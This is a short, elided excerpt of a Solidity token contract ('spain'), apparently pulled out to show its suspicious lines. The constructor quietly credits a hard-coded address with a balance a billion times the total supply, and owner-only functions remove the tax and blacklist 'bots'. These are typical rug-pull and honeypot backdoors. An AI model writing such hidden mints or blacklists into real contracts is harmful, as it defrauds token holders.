...
contract spain is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        _balances[address(0x28246475Aaf132cE81576feE88011235887D047C)] = 1000_000_000*_tTotal;
    ...
    function _removeTax() external onlyOwner{
        _transferTax = 0;
    ...
    function _addBots_(address[] memory bots_) public onlyOwner {
